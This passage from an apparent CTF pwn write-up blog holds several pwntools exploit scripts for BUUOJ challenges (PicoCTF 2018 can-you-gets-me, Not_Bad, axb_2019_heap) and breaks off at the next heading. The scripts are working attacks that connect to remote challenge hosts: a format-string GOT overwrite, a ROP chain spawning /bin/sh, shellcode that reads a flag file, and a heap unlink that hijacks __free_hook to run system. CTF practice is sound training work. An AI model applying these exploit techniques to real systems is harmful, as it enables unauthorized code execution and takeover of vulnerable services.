class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;%7$s&#x27;</span>+ p32(printf_got)</span><br><span class="line">sa(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line">printf_addr = l32()</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;printf&#x27;, printf_addr)</span></span><br><span class="line"><span class="comment"># libcbase = printf_addr - libc.dump(&#x27;printf&#x27;)</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="comment"># binsh = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"></span><br><span class="line">libcbase = printf_addr - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libcbase + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">lg(<span class="string">&#x27;printf_addr&#x27;</span>, printf_addr)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line">lg(<span class="string">&#x27;binsh&#x27;</span>, binsh)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system&#125;)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">&#x27;\n&#x27;</span>, payload)</span><br><span class="line">se(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-93-PicoCTF-2018-can-you-gets-me-solve"><a href="#NO-93-PicoCTF-2018-can-you-gets-me-solve" class="headerlink" title="NO.93 PicoCTF_2018_can-you-gets-me_solve"></a>NO.93 PicoCTF_2018_can-you-gets-me_solve</h1><h3 id="exp-93"><a href="#exp-93" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29823</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x18</span>+<span class="number">4</span>)</span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea064</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080b81c6</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">payload += <span class="string">&#x27;//sh&#x27;</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080549db</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080481c9</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea060</span>) <span class="comment"># @ .data</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080de955</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806f02a</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x080ea068</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x08049303</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0807a86f</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">payload += pack(<span class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-94-极客大挑2019-Not-Bad-solve"><a href="#NO-94-极客大挑2019-Not-Bad-solve" class="headerlink" title="NO.94 极客大挑2019_Not_Bad_solve"></a>NO.94 极客大挑2019_Not_Bad_solve</h1><h3 id="exp-94"><a href="#exp-94" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./极客大挑2019_Not_Bad&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26453</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;极客大挑2019_Not_Bad&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line">mmap = <span class="number">0x123000</span></span><br><span class="line">jmp_rsp = <span class="number">0x0000000000400a01</span></span><br><span class="line"></span><br><span class="line">payload = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line">payload+= shellcraft.read(<span class="number">3</span>,mmap+<span class="number">0x100</span>, <span class="number">100</span>)</span><br><span class="line">payload+= shellcraft.write(<span class="number">1</span>, mmap+<span class="number">0x100</span>, <span class="number">100</span>)</span><br><span class="line">payload = asm(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1 = asm(shellcraft.read(<span class="number">0</span>, mmap, <span class="number">100</span>)) + asm(<span class="string">&quot;mov rax, 0x123000; jmp rax&quot;</span>)</span><br><span class="line">payload1 = payload1.ljust(<span class="number">0x28</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload1+= p64(jmp_rsp)+asm(<span class="string">&quot;sub rsp, 0x30; jmp rsp&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload1)))</span><br><span class="line">sl(payload1)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-95-axb-2019-heap-solve"><a href="#NO-95-axb-2019-heap-solve" class="headerlink" title="NO.95 axb_2019_heap_solve"></a>NO.95 axb_2019_heap_solve</h1><h3 id="exp-95"><a href="#exp-95" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./axb_2019_heap&#x27;</span>)<span class="comment">#,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27268</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;axb_2019_heap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">o_g = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line">magic = [<span class="number">0x3c4b10</span>,<span class="number">0x3c67a8</span>,<span class="number">0x846c0</span>,<span class="number">0x45390</span>]<span class="comment">#malloc,free,realloc,system</span></span><br><span class="line">l64 = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32 = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b  :p.sendlineafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b  :p.sendafter(<span class="built_in">str</span>(a),<span class="built_in">str</span>(b))</span><br><span class="line">lg  = <span class="keyword">lambda</span> name,data : p.success(name + <span class="string">&quot;: 0x%x&quot;</span> % data)</span><br><span class="line">se  = <span class="keyword">lambda</span> payload: p.send(payload)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : p.recv()</span><br><span class="line">sl  = <span class="keyword">lambda</span> payload: p.sendline(payload)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a     :p.recvuntil(<span class="built_in">str</span>(a))</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;(0-10):&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;size:\n&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">sla(<span class="string">&#x27;content: \n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;index:\n&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">sla(<span class="string">&#x27;content: \n&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a%15$p-%19$p&quot;</span></span><br><span class="line">sla(<span class="string">&#x27;Enter your name: &#x27;</span>, payload)</span><br><span class="line"><span class="comment"># leak __libc_start_main</span></span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">__libc_start_main = <span class="built_in">int</span>(p.recv(<span class="number">0xe</span>),<span class="number">16</span>)-<span class="number">240</span></span><br><span class="line">ru(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"><span class="comment"># leak main_addr</span></span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">0xe</span>),<span class="number">16</span>) - <span class="number">0x000000000000116A</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">libcbase = __libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">__free_hook = libcbase + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">system = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = elf.libc</span></span><br><span class="line"><span class="comment"># libcbase = __libc_start_main - libc.sym[&#x27;__libc_start_main&#x27;]</span></span><br><span class="line"><span class="comment"># __free_hook = libcbase + libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line"><span class="comment"># system = libcbase + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line"></span><br><span class="line">lg(<span class="string">&#x27;pie&#x27;</span>, pie)</span><br><span class="line">lg(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">lg(<span class="string">&#x27;libcbase&#x27;</span>, libcbase)</span><br><span class="line">lg(<span class="string">&#x27;__free_hook&#x27;</span>, __free_hook)</span><br><span class="line">lg(<span class="string">&#x27;system&#x27;</span>, system)</span><br><span class="line"></span><br><span class="line">note = pie + <span class="number">0x202060</span></span><br><span class="line"><span class="comment">###off by one</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x88</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x88</span>, <span class="string">&#x27;b&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x88</span>, <span class="string">&#x27;c&#x27;</span>*<span class="number">0x88</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x88</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## unlink</span></span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x80</span>) <span class="comment"># pre_size chunk_size </span></span><br><span class="line">payload+= p64(note-<span class="number">0x18</span>)+p64(note-<span class="number">0x10</span>) <span class="comment"># fd bk</span></span><br><span class="line">payload+= <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>*<span class="number">12</span> <span class="comment">#padding</span></span><br><span class="line">payload+= p64(<span class="number">0x80</span>)+p8(<span class="number">0x90</span>) <span class="comment"># pre_size(fake_chunk_size) chunk_size</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0 -&gt; note-0x18</span></span><br><span class="line"><span class="comment">###### get_input(__free_hook, 0x8) : __free_hook -&gt; system</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>)*<span class="number">3</span> + p64(__free_hook)+p64(<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-96-picoctf-2018-leak-me-solve"><a href="#NO-96-picoctf-2018-leak-me-solve" class="headerlink" title="NO.96 picoctf_2018_leak_me_solve"></a>NO.96 picoctf_2018_leak_me_solve</h1><h3 id="exp-96"><a href="#exp-96" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 